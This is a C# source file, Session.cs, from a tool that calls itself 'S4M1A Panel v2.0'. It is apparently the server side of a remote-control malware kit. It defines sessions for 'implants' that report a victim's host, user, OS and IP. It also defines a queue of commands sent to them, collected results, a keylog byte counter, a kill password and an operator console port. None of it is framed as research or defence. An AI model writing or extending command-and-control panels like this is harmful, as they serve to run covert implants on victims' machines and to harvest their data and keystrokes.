using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;

namespace S4M1A.Panel
{
    // =====================================================================
    //  S4M1A Panel v2.0 - Session.cs
    //  Data model: Session / CmdTask / CmdResult / PanelConfig
    //  Persistence: SessionStore (atomic JSON journal -> data\sessions.json)
    //
    //  Wire task JSON sent to the implant (must match Commands.cs):
    //    {"t":"cmd","cid":"<16 hex>","cmd":"<name>","args":"<string>"}
    // =====================================================================

    [DataContract]
    public sealed class CmdTask
    {
        [DataMember(Name = "t")]        public string T { get { return "cmd"; } set { } }
        [DataMember(Name = "cid")]      public string Cid { get; set; }
        [DataMember(Name = "cmd")]      public string Cmd { get; set; }
        [DataMember(Name = "args")]     public string Args { get; set; }
        [DataMember]                    public DateTime CreatedUtc { get; set; }
    }

    [DataContract]
    public sealed class CmdResult
    {
        [DataMember(Name = "cid")]  public string Cid { get; set; }
        [DataMember(Name = "ok")]   public bool Ok { get; set; }
        [DataMember(Name = "data")] public string Data { get; set; }
        [DataMember(Name = "err")]  public string Err { get; set; }
        [DataMember(Name = "act")]  public string Act { get; set; }
        [DataMember]                public DateTime ReceivedUtc { get; set; }
    }

    [DataContract]
    public sealed class Session
    {
        [DataMember] public string Sid { get; set; }
        [DataMember] public string ImplantId { get; set; }
        [DataMember] public string Group { get; set; }
        [DataMember] public string Host { get; set; }
        [DataMember] public string User { get; set; }
        [DataMember] public string Os { get; set; }
        [DataMember] public string Arch { get; set; }
        [DataMember] public int Pid { get; set; }
        [DataMember] public string Ip { get; set; }
        [DataMember] public long UptimeSec { get; set; }
        [DataMember] public string Alias { get; set; }
        [DataMember] public DateTime FirstSeenUtc { get; set; }
        [DataMember] public DateTime LastSeenUtc { get; set; }
        [DataMember] public List<CmdTask> Queue { get; set; }
        [DataMember] public List<CmdResult> Results { get; set; }
        [DataMember] public long KlogBytes { get; set; }

        public bool IsAlive(double maxHours)
        {
            return (DateTime.UtcNow - LastSeenUtc).TotalHours <= maxHours;
        }

        // Merges the "info" payload the implant sends each beacon.
        public void UpdateInfo(Dictionary<string, string> info)
        {
            if (info == null) return;
            string v;
            if (info.TryGetValue("group", out v)) Group = v;
            if (info.TryGetValue("host", out v))  Host = v;
            if (info.TryGetValue("user", out v))  User = v;
            if (info.TryGetValue("os", out v))    Os = v;
            if (info.TryGetValue("arch", out v))  Arch = v;
            if (info.TryGetValue("ip", out v))    Ip = v;
            if (info.TryGetValue("id", out v))    ImplantId = v;

            int i;
            if (info.TryGetValue("pid", out v) && int.TryParse(v, out i)) Pid = i;
            long l;
            if (info.TryGetValue("up", out v) && long.TryParse(v, out l)) UptimeSec = l;

            LastSeenUtc = DateTime.UtcNow;
        }

        public CmdTask NextTask()
        {
            if (Queue == null || Queue.Count == 0) return null;
            CmdTask t = Queue[0];
            Queue.RemoveAt(0);
            return t;
        }
    }

    [DataContract]
    public sealed class PanelConfig
    {
        [DataMember(Name = "port")]        public int Port { get; set; }        // implant HTTPS port
        [DataMember(Name = "cert_hash")]   public string CertHash { get; set; } // sslcert thumbprint (uppercase, no colons)
        [DataMember(Name = "admin_port")]  public int AdminPort { get; set; }   // operator console port
        [DataMember(Name = "kill")]        public string KillPassword { get; set; }
        [DataMember(Name = "dead_hours")]  public double DeadHours { get; set; }
        [DataMember(Name = "bearer")]      public string Bearer { get; set; }   // null = disabled
        [DataMember(Name = "data_dir")]    public string DataDir { get; set; }  // default "data"
    }

    // =====================================================================
    //  SessionStore - single JSON file journal of all sessions
    // =====================================================================

    public static class SessionStore
    {
        private static readonly object _lock = new object();
        private static List<Session> _sessions = new List<Session>();
        private static string _path = "";
        private static readonly DataContractJsonSerializer _ser =
            new DataContractJsonSerializer(typeof(List<Session>));

        public static void Init(string dataDir)
        {
            lock (_lock)
            {
                try { Directory.CreateDirectory(dataDir); } catch { }
                _path = Path.Combine(dataDir, "sessions.json");
                if (File.Exists(_path))
                {
                    try
                    {
                        using (FileStream fs = File.OpenRead(_path))
                            _sessions = (List<Session>)_ser.ReadObject(fs) ?? new List<Session>();
                    }
                    catch { _sessions = new List<Session>(); }
                }
            }
        }

        public static void Save()
        {
            lock (_lock)
            {
                try
                {
                    if (string.IsNullOrEmpty(_path)) return;
                    string tmp = _path + ".tmp";
                    using (FileStream fs = File.Create(tmp))
                        _ser.WriteObject(fs, _sessions);
                    if (File.Exists(_path)) File.Replace(tmp, _path, null);
                    else File.Move(tmp, _path);
                }
                catch { }
            }
        }

        public static Session GetOrCreate(string sid)
        {
            lock (_lock)
            {
                Session s = _sessions.FirstOrDefault(x => x.Sid == sid);
                if (s == null)
                {
                    s = new Session
                    {
                        Sid = sid,
                        FirstSeenUtc = DateTime.UtcNow,
                        LastSeenUtc = DateTime.UtcNow,
                        Queue = new List<CmdTask>(),
                        Results = new List<CmdResult>()
                    };
                    _sessions.Add(s);
                    Save();
                }
                return s;
            }
        }

        public static List<Session> All()
        {
            lock (_lock) { return _sessions.ToList(); }
        }

        public static Session Find(string sid)
        {
            lock (_lock) { return _sessions.FirstOrDefault(x => x.Sid == sid); }
        }

        public static void RemoveDead(double maxHours)
        {
            lock (_lock)
            {
                int before = _sessions.Count;
                _sessions.RemoveAll(s => !s.IsAlive(maxHours));
                if (_sessions.Count != before) Save();
            }
        }
    }
}